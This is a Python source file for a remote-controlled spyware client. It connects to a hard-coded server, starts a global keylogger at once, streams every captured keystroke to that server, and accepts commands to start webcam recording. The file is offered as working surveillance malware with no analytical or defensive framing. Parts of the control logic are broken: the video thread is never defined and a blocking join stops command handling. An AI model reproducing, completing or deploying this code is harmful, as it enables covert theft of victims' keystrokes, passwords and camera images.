import socket
import cv2
import threading
import keyboard
from threading import Timer
from datetime import datetime

SERVER_HOST = "192.168.0.8"
SERVER_PORT = 4000
BUFFER_SIZE = 1024 * 128
SEND_REPORT_EVERY = 10  # in seconds

# Create the socket object.
s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

cap = None

def handle_server_commands():
    global cap
    while True:
            command = s.recv(BUFFER_SIZE).decode()
            if command == "START_KEYLOGGER":
                if not keylogger_thread.is_alive():
                    keylogger_thread.start()
                    print(f"Keylogger started")
            elif command == "STOP_KEYLOGGER":
                if keylogger_thread.is_alive():
                    keyboard.unhook_all()
                    print(f"Keylogger stopped")
            elif command == "START_VIDEO":
                if not recording_thread.is_alive():
                    cap = cv2.VideoCapture(0)
                    recording_thread.start()
                    print(f"Video recording started")
            elif command == "STOP_VIDEO":
                if recording_thread.is_alive():
                    cap.release()
                    cv2.destroyAllWindows()
                    print(f"Video recording stopped")
            elif command == "EXIT":
                s.close()
                break


class Keylogger:
    def __init__(self, interval, server_socket, report_method="file"):
        self.interval = interval
        self.log = ""
        self.server_socket = server_socket

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
        self.send_keypress(name)

    def send_keypress(self, keypress):
        try:
            self.server_socket.sendall(keypress.encode())
        except Exception as e:
            print(f"Error sending keypress: {e}")



    def start(self):
        keyboard.on_release(callback=self.callback)
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()



keylogger = Keylogger(interval=SEND_REPORT_EVERY, server_socket=s)
keylogger_thread = threading.Thread(target=keylogger.start)
keylogger_thread.start()
keylogger_thread.join()


s.close()